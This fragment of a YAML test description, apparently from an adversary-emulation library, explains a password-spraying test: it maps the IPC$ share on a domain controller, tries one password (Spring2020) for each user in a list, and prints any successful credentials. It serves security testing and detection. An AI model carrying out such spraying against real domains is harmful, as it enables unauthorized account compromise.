  description: 
    CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.

    This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. 
    Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period.
    Use the input arguments to specify your own password to use for the password spray.

    Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.

    See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
